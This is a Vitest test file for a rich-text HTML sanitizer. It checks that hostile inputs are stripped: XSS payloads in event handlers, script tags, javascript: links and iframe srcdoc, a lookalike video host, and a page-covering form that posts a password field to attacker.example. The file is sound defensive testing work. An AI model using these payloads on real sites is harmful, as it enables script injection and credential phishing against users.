// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { sanitizeRichText } from '../richText';

describe('rich-text HTML', () => {
  it('strips persisted event handlers, scripts and executable links before editor insertion', () => {
    const result = sanitizeRichText(
      '<p><strong>Report</strong><img src="/chart.png" onloadstart="alert(1)" onerror="alert(2)"><script>alert(3)</script><a href="javascript:alert(4)">link</a></p>'
    );
    const root = document.createElement('div');
    root.innerHTML = result;
    expect(root.querySelector('strong')?.textContent).toBe('Report');
    expect(root.querySelector('img')?.getAttribute('src')).toBe('/chart.png');
    expect(root.querySelector('img')?.getAttributeNames()).toEqual(['src']);
    expect(root.querySelector('script')).toBeNull();
    expect(root.querySelector('a')?.hasAttribute('href')).toBe(false);
  });
  it('removes form controls and page-covering styles while retaining rich-text formatting', () => {
    const result = sanitizeRichText(
      '<div class="ql-align-center el-overlay ql-tooltip" style="position:fixed;inset:0;z-index:2147483647;color:rgb(255, 0, 0);font-weight:bold">Report<form action="https://attacker.example/collect" method="post"><input name="password" type="password"><button>Continue</button></form></div>'
    );
    const root = document.createElement('div');
    root.innerHTML = result;
    expect(root.querySelector('form,input,button')).toBeNull();
    const block = root.querySelector('div')!;
    expect(block.className).toBe('ql-align-center');
    expect(block.style.position).toBe('');
    expect(block.style.inset).toBe('');
    expect(block.style.zIndex).toBe('');
    expect(block.style.color).toBe('rgb(255, 0, 0)');
    expect(block.style.fontWeight).toBe('bold');
    expect(root.textContent).toContain('Report');
  });
  it('drops foreign namespaces and interactive widgets from rich-text HTML', () => {
    const result = sanitizeRichText(
      '<svg style="position:fixed"><foreignObject><form><input></form></foreignObject></svg><math style="position:fixed"><mi>value</mi></math><dialog open>message</dialog><p class="ql-indent-2">Text</p>'
    );
    const root = document.createElement('div');
    root.innerHTML = result;
    expect(root.querySelector('svg,math,foreignObject,form,input,dialog')).toBeNull();
    expect(root.querySelector('p')?.className).toBe('ql-indent-2');
  });
  it('keeps supported HTTPS video embeds sandboxed and rejects same-origin and hostile frames', () => {
    const result = sanitizeRichText(
      '<iframe src="https://www.youtube.com/embed/example"></iframe><iframe src="https://player.vimeo.com/video/123"></iframe><iframe src="/admin/"></iframe><iframe src="https://www.youtube.com.evil.example/embed/x"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>'
    );
    const root = document.createElement('div');
    root.innerHTML = result;
    expect(root.querySelectorAll('iframe')).toHaveLength(2);
    for (const frame of root.querySelectorAll('iframe')) {
      expect(frame.getAttribute('sandbox')).toBe('allow-scripts allow-same-origin allow-presentation');
      expect(frame.getAttribute('referrerpolicy')).toBe('no-referrer');
      expect(frame.hasAttribute('srcdoc')).toBe(false);
    }
  });
});
